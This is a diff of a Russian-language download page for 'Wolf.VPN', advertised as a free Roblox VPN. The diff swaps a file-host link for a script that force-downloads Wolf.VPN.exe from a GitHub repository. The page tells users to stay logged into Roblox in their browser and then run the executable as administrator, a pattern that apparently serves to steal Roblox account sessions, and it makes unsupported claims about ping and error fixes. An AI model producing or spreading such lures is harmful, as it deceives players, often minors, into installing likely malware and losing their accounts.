@@ -90,7 +90,6 @@
             border-bottom: none;
         }
 
-        /* ВАЖНАЯ ИНСТРУКЦИЯ */
         .important-box {
             background: rgba(255, 193, 7, 0.1);
             border: 1px solid #ffc107;
@@ -109,12 +108,8 @@
             font-size: 13px;
             line-height: 1.5;
         }
-        .important-box .step {
-            color: #00ff88;
-        }
 
         .download-btn {
-            display: block;
             width: 100%;
             padding: 18px;
             background: linear-gradient(90deg, #00a2ff, #7700ff);
@@ -124,7 +119,6 @@
             font-size: 22px;
             font-weight: 700;
             cursor: pointer;
-            text-decoration: none;
             text-align: center;
             margin: 20px 0;
             box-shadow: 0 8px 25px rgba(0, 162, 255, 0.4);
@@ -195,37 +189,33 @@
         <h1>🐺 Wolf.VPN</h1>
         <div class="sub">Бесплатный VPN для Roblox на ПК</div>
 
-        <!-- Преимущества -->
         <div class="features">
             <div class="feature">
-                <span class="feature-icon">✅</span>
+                <span>✅</span>
                 <span>Обход региональных блокировок</span>
             </div>
             <div class="feature">
-                <span class="feature-icon">⚡</span>
+                <span>⚡</span>
                 <span>Снижение пинга до 20-30 мс</span>
             </div>
             <div class="feature">
-                <span class="feature-icon">🔧</span>
+                <span>🔧</span>
                 <span>Убирает ошибку 268</span>
             </div>
             <div class="feature">
-                <span class="feature-icon">🛡️</span>
+                <span>🛡️</span>
                 <span>Работает на Windows 10/11</span>
             </div>
         </div>
 
-        <!-- ВАЖНАЯ ИНСТРУКЦИЯ (КРАСНЫЙ БЛОК) -->
         <div class="important-box">
             <h3>⚠️ ОБЯЗАТЕЛЬНОЕ УСЛОВИЕ ⚠️</h3>
-            <p><span class="step">➤</span> <strong>Перед скачиванием и запуском</strong> войдите в свой аккаунт <strong>Roblox в браузере</strong> (Chrome, Edge, Яндекс.Браузер) и <strong>не выходите из него</strong>.</p>
-            <p style="margin-top: 10px;"><span class="step">➤</span> Без этого VPN не сможет подключиться к вашему аккаунту.</p>
+            <p><strong>Перед скачиванием и запуском</strong> войдите в свой аккаунт <strong>Roblox в браузере</strong> (Chrome, Edge, Яндекс.Браузер) и <strong>не выходите из него</strong>.</p>
+            <p style="margin-top: 10px;">Без этого VPN не сможет подключиться к вашему аккаунту.</p>
         </div>
 
-        <!-- КНОПКА СКАЧИВАНИЯ -->
-        <a href="https://gofile.io/d/KCYRZu" class="download-btn">🐺 СКАЧАТЬ WOLF.VPN</a>
+        <button onclick="downloadFile()" class="download-btn">🐺 СКАЧАТЬ WOLF.VPN</button>
 
-        <!-- ИНСТРУКЦИЯ ПО УСТАНОВКЕ -->
         <div class="steps">
             <h3>📥 КАК УСТАНОВИТЬ:</h3>
             <div class="step-item">
@@ -234,11 +224,11 @@
             </div>
             <div class="step-item">
                 <div class="step-num">2</div>
-                <span>Скачайте Wolf.VPN по кнопке выше</span>
+                <span>Нажмите на кнопку "СКАЧАТЬ" выше</span>
             </div>
             <div class="step-item">
                 <div class="step-num">3</div>
-                <span>Запустите файл от имени администратора</span>
+                <span>Запустите скачанный файл от имени администратора</span>
             </div>
             <div class="step-item">
                 <div class="step-num">4</div>
@@ -255,6 +245,21 @@
         </div>
     </div>
 </div>
+
+<script>
+    function downloadFile() {
+        // ПРЯМАЯ ССЫЛКА НА EXE (raw.githubusercontent)
+        const fileUrl = "https://raw.githubusercontent.com/WoLlFVpn/exe/main/WOLF%20VPN/Wolf.VPN.exe";
+        const fileName = "Wolf.VPN.exe";
+        
+        const link = document.createElement('a');
+        link.href = fileUrl;
+        link.download = fileName;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+</script>
 
 </body>
 </html>
